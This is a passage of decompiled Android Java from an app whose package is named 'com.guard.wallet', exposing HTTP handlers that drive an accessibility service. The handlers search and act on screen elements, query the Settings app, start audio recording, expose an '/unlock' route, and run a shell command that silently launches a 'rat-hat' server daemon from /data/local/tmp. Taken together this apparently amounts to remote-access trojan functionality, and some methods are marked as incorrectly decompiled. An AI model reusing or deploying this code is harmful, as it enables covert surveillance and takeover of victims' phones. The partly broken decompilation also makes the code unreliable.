            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void R2(List list, AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            C0416e m523d = MyAccessibilityService.m554P().m523d("com.android.settings", list);
            ApiResult apiResult = new ApiResult();
            if (m523d != null) {
                apiResult.setData(m523d.f864c);
                apiResult.setCount(1);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.valueOf(AbstractC0251g.f1()));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: S */
    public static void m477S(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByDescMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void S0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByIdMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void S1(AbstractC0381k abstractC0381k) {
        try {
            LinkedList e02 = AbstractC0251g.e0();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(e02);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(!e02.isEmpty() ? Integer.valueOf(e02.size()) : 0);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:10:0x0040 A[Catch: Exception -> 0x0142, TryCatch #0 {Exception -> 0x0142, blocks: (B:2:0x0000, B:4:0x0008, B:8:0x0012, B:10:0x0040, B:11:0x004e, B:13:0x0054, B:15:0x00bd, B:17:0x00c9, B:23:0x00f7, B:25:0x0104, B:27:0x010a, B:29:0x0110, B:32:0x00f2, B:33:0x0113, B:36:0x005a, B:38:0x0060, B:41:0x006c, B:43:0x0072, B:46:0x007a, B:48:0x0094, B:50:0x009a, B:52:0x00a0, B:54:0x0128, B:19:0x00d0, B:21:0x00d6, B:22:0x00d9), top: B:1:0x0000, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:17:0x00c9 A[Catch: Exception -> 0x0142, TRY_LEAVE, TryCatch #0 {Exception -> 0x0142, blocks: (B:2:0x0000, B:4:0x0008, B:8:0x0012, B:10:0x0040, B:11:0x004e, B:13:0x0054, B:15:0x00bd, B:17:0x00c9, B:23:0x00f7, B:25:0x0104, B:27:0x010a, B:29:0x0110, B:32:0x00f2, B:33:0x0113, B:36:0x005a, B:38:0x0060, B:41:0x006c, B:43:0x0072, B:46:0x007a, B:48:0x0094, B:50:0x009a, B:52:0x00a0, B:54:0x0128, B:19:0x00d0, B:21:0x00d6, B:22:0x00d9), top: B:1:0x0000, inners: #1 }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void S2(AbstractC0381k abstractC0381k) {
        boolean z2;
        ApiResult apiResult;
        try {
            if (!AbstractC0252h.m710n() && !AbstractC0252h.m711o()) {
                z2 = false;
                apiResult = new ApiResult();
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                Boolean bool = Boolean.TRUE;
                apiResult.setSuccess(bool);
                apiResult.setData(bool);
                BlockViewVO blockViewVO = new BlockViewVO(false, null, true, true);
                if (AbstractC0249e.m621j()) {
                    MyAccessibilityService.m554P().getClass();
                    blockViewVO.setBlockDrawable(MyAccessibilityService.o0());
                }
                if (!C0435x.m1159R() || AbstractC0251g.m656c()) {
                    if (MyAccessibilityService.m554P() != null && !MyAccessibilityService.m554P().m529j()) {
                        if (!C0420i.m1118O() && AbstractC0251g.r0() && !z2) {
                            apiResult.setData(Boolean.FALSE);
                            String m693N = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N);
                            abstractC0381k.mo787l();
                            return;
                        }
                        if (AbstractC0251g.p0() && !AbstractC0251g.p1(null)) {
                            AbstractC0184g.m349c();
                            apiResult.setData(Boolean.FALSE);
                            String m693N2 = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N2);
                            abstractC0381k.mo787l();
                            return;
                        }
                    }
                    apiResult.setData(Boolean.FALSE);
                    String m693N3 = AbstractC0252h.m693N(apiResult);
                    abstractC0381k.f771l = apiResult.getCode().intValue();
                    abstractC0381k.m952h(m693N3);
                    abstractC0381k.mo787l();
                }
                if (((Boolean) apiResult.getData()).booleanValue()) {
                    MyAccessibilityService m554P = MyAccessibilityService.m554P();
                    m554P.getClass();
                    try {
                        if (m554P.m534o()) {
                            m554P.m516A();
                        }
                        m554P.f303a.add(new C0435x());
                        m554P.m539t(C0435x.class.getName(), C0435x.m1156N());
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                    }
                    MyAccessibilityService.m554P().m520a();
                    if (C0435x.m1159R() || AbstractC0251g.m656c() || C0420i.m1118O()) {
                        AbstractC0184g.m347a(blockViewVO);
                    }
                }
                String m693N4 = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N4);
                abstractC0381k.mo787l();
                return;
            }
            z2 = true;
            apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            Boolean bool2 = Boolean.TRUE;
            apiResult.setSuccess(bool2);
            apiResult.setData(bool2);
            BlockViewVO blockViewVO2 = new BlockViewVO(false, null, true, true);
            if (AbstractC0249e.m621j()) {
            }
            if (!C0435x.m1159R()) {
            }
            if (MyAccessibilityService.m554P() != null) {
                if (!C0420i.m1118O()) {
                }
                if (AbstractC0251g.p0()) {
                    AbstractC0184g.m349c();
                    apiResult.setData(Boolean.FALSE);
                    String m693N22 = AbstractC0252h.m693N(apiResult);
                    abstractC0381k.f771l = apiResult.getCode().intValue();
                    abstractC0381k.m952h(m693N22);
                    abstractC0381k.mo787l();
                    return;
                }
                if (((Boolean) apiResult.getData()).booleanValue()) {
                }
                String m693N42 = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N42);
                abstractC0381k.mo787l();
                return;
            }
            apiResult.setData(Boolean.FALSE);
            String m693N32 = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N32);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    /* renamed from: T */
    public static void m478T(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByDescStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void T0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByIdStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void T1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(C0318e.m844S() != null ? C0318e.m844S().m853L() : 0);
            apiResult.setCount(1);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void T2(AbstractC0381k abstractC0381k) {
        A1(abstractC0381k, "nohup /data/local/tmp/rat-hat server -d > /dev/null &");
    }

    /* renamed from: U */
    public static void m479U(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findById(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void U0(CombineFiltersWithOr combineFiltersWithOr, AbstractC0381k abstractC0381k) {
        String delegateId;
        if (combineFiltersWithOr != null) {
            try {
                delegateId = combineFiltersWithOr.getDelegateId();
            } catch (Exception e2) {
                AbstractC0026q.m186s("HttpServer", e2);
                return;
            }
        } else {
            delegateId = null;
        }
        C0416e o12 = o1(delegateId);
        if (m508x(o12, abstractC0381k)) {
            return;
        }
        if (o12 == null) {
            m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
            return;
        }
        SearchNodeResultVO m1070i = o12.m1070i(combineFiltersWithOr);
        ApiResult apiResult = new ApiResult();
        apiResult.setData(m1070i);
        apiResult.setCode(200);
        apiResult.setMsg("OK");
        apiResult.setCount(1);
        apiResult.setSuccess(Boolean.TRUE);
        String m693N = AbstractC0252h.m693N(apiResult);
        abstractC0381k.f771l = apiResult.getCode().intValue();
        abstractC0381k.m952h(m693N);
        abstractC0381k.mo787l();
    }

    public static void U1(AbstractC0381k abstractC0381k) {
        try {
            DevicePairStateVO of = DevicePairStateVO.of();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(of);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void U2(int i2, AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData((AbstractC0251g.m653Z() == null || ContextCompat.checkSelfPermission(AbstractC0251g.m653Z(), "android.permission.RECORD_AUDIO") != 0) ? Boolean.FALSE : Boolean.valueOf(C0349d.m881b().m883d(i2)));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: V */
    public static void m480V(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByIdContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void V0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByText(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void V1(AbstractC0381k abstractC0381k, String str) {
        try {
            if (AbstractC0026q.m151B(str)) {
                m500p(abstractC0381k, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            apiResult.setData(AbstractC0251g.g0(str));
            apiResult.setCount(1);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void V2(AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(MyAccessibilityService.m554P().s0()));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: W */
    public static void m481W(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByIdEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void W0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByTextContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void W1(AbstractC0381k abstractC0381k, String str) {
        try {
            PermissionsBodyVO h02 = AbstractC0251g.h0(str);
            h02.setDeviceId(AbstractC0252h.m708l("deviceId"));
            ApiResult apiResult = new ApiResult();
            apiResult.setData(h02);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: X */
    public static void m482X(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByIdMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void X0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByTextEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void X1(String str, String str2, AbstractC0381k abstractC0381k) {
        char c;
        try {
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
        if (AbstractC0026q.m151B(str)) {
            n1(abstractC0381k);
            return;
        }
        switch (str.hashCode()) {
            case -2131396405:
                if (str.equals("/target/findParentUtilCombine")) {
                    c = '(';
                    break;
                }
                c = 65535;
                break;
            case -2111956370:
                if (str.equals("/startDevSetting")) {
                    c = 7;
                    break;
                }
                c = 65535;
                break;
            case -2077441997:
                if (str.equals("/unlock")) {
                    c = 21;
                    break;
                }
                c = 65535;
                break;
            case -2075141461:
                if (str.equals("/target/scrollForwardUtilWithChild")) {
                    c = '1';
                    break;
                }
                c = 65535;
                break;
            case -2061155355:
                if (str.equals("/target/scrollBackwardUtilMultipleWithChild")) {
                    c = '4';
                    break;
                }
                c = 65535;
                break;
            case -2029690228:
